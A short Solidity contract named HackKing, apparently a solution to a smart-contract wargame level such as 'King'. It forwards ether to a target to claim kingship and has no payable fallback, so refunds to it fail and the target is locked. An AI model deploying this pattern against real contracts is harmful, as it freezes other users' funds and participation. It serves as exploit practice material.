pragma solidity ^0.5.0;

contract HackKing {
    function becomeKing (address king) public payable {
        king.call.value(msg.value)('');
    }
}
